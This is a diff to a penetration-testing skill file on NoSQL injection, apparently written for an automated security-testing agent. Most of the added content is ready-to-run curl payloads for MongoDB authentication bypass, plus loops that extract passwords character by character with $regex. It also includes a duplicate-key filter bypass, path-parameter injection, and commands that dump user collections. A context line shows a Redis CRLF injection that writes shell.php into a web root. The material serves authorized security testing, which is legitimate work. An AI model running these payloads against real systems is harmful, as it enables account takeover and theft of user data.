@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "NoSQL Injection (e.g. MongoDB update/insert operators) allows writing attacker-controlled data into document fields rendered without sanitization elsewhere, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
 ---
 
 # wstg-inpv-05.6
@@ -35,6 +36,7 @@ NoSQL injection targets NoSQL databases (MongoDB, CouchDB, Redis, etc.) where tr
 - [ ] JSON injection in queries
 - [ ] JavaScript execution (server-side)
 - [ ] Authentication bypass
+- [ ] Path / route-parameter operator injection (/resource/:id)
 - [ ] Array/object injection
 - [ ] Redis command injection
 
@@ -67,6 +69,16 @@ curl -s -X POST "$TARGET" \
 
 # URL parameter injection
 curl -s "$TARGET?username[\$ne]=&password[\$ne]="
+
+# Path / route parameter injection — DO NOT skip path params.
+# Many REST apps interpolate a path segment straight into a Mongo query
+# (e.g. /resource/:id, /track-order/:id, /orders/:id). Inject there too:
+curl -s "$TARGET/rest/<resource>/<id>' || 'a'=='a"
+curl -s "$TARGET/rest/<resource>/<id>%27%20%7C%7C%20%271%27%3D%3D%271"   # URL-encoded
+curl -s "$TARGET/api/<Collection>/{\"\$gt\":\"\"}"
+# A path param that alters the result set / returns other users' records /
+# errors with a Mongo message is injectable. This vector is the one most often
+# MISSED because testers only fuzz query + body.
 ```
 
 ### Step 2: NoSQL Injection Tester
@@ -362,6 +374,104 @@ SET user "test\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.ph
 | Burp Suite | Manual testing            |
 | mongosh    | MongoDB client            |
 | redis-cli  | Redis client              |
+
+---
+
+## Example Commands/Payloads
+
+### MongoDB Auth Bypass (curl, JSON API)
+
+```bash
+TARGET="https://target.com/api/login"
+
+# Operator injection - $ne / $gt bypass
+curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
+    -d '{"username":{"$ne":null},"password":{"$ne":null}}'
+
+curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":{"$gt":""}}'
+
+# Same bypass via URL-encoded form params (common in Express + body-parser)
+curl -s -X POST "$TARGET" -d "username[\$ne]=x&password[\$ne]=y"
+
+# $where JavaScript injection (if input reaches a $where clause)
+curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
+    -d '{"username":"admin","$where":"sleep(5000)"}'
+```
+
+### Blind Data Extraction via $regex
+
+```bash
+# Extract password character by character using regex anchors
+for c in a b c d e f 0 1 2 3; do
+  resp=$(curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
+      -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$c\"}}")
+  echo "$c -> $resp" | grep -q "success" && echo "[+] Next char: $c"
+done
+```
+
+### mongosh / redis-cli Direct Access (if reachable / creds obtained)
+
+```bash
+# MongoDB - dump collections once auth is bypassed or creds found
+mongosh "mongodb://target.com:27017/appdb" --eval "db.users.find().pretty()"
+
+# Redis - command injection via CRLF if user input is concatenated raw into protocol
+redis-cli -h target.com -p 6379 EVAL "return redis.call('keys','*')" 0
+```
+
+### Automated Scanner
+
+```bash
+# NoSQLMap - detect and exploit MongoDB injection
+python2 nosqlmap.py   # interactive menu: set target URL, request method, injectable param
+```
+
+### Full Operator Auth-Bypass Set (form-encoded, one line per technique)
+
+```bash
+# $ne, $regex, $gt/$lt range trick, $nin exclusion - each is a standalone bypass
+curl -s -X POST "$TARGET" -d "username[\$ne]=toto&password[\$ne]=toto"
+curl -s -X POST "$TARGET" -d "login[\$regex]=a.*&pass[\$ne]=lol"
+curl -s -X POST "$TARGET" -d "login[\$gt]=admin&login[\$lt]=test&pass[\$ne]=1"
+curl -s -X POST "$TARGET" -d "login[\$nin][]=admin&login[\$nin][]=test&pass[\$ne]=toto"
+```
+
+### Extract Data Length Before Content (narrows the char-by-char search space)
+
+```bash
+# Increase {n} until the response flips true - reveals password length first
+for n in 1 2 3 4 5 6 7 8; do
+  curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
+      -d "{\"username\":{\"\$ne\":\"toto\"},\"password\":{\"\$regex\":\"^.{$n}$\"}}"
+done
+```
+
+### $in Operator - Batch-Guess Common Usernames in One Request
+
+```bash
+curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
+    -d '{"username":{"$in":["admin","4dm1n","administrator","root"]},"password":{"$gt":""}}'
+```
+
+### Duplicate-Key WAF/Filter Bypass
+
+If the app strips `$`-prefixed keys from top-level JSON but not from a duplicated key, MongoDB/Node JSON parsers keep only the *last* occurrence of a duplicate key — smuggle the operator past a naive sanitizer:
+
+```json
+{"password": "dummy", "password": {"$ne": "dummy"}}
+```
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| Login succeeds with `{"$ne": null}` / `{"$gt": ""}` instead of a real credential | NoSQL operator injection — authentication bypass confirmed |
+| Response differs (true/false) based on `$regex` anchor character | Blind boolean-based NoSQL injection, data can be exfiltrated char-by-char |
+| Response delayed when `$where` payload contains `sleep(N)` | Server-side JavaScript execution via `$where` — high severity (RCE-adjacent) |
+| Array/object syntax in form field (`field[$ne]=x`) is accepted and parsed as an operator | Framework's body parser (e.g. `qs`/`body-parser`) auto-expands bracket notation into query operators |
+| A duplicated JSON key with a later `$`-operator value still takes effect after sanitization | Sanitizer only strips the first occurrence — duplicate-key WAF bypass confirmed |
+| `$regex":"^.{n}$"` flips true at exactly one length `n` | Field length disclosed, reduces subsequent char-by-char brute force to that fixed length |
 
 ---
 
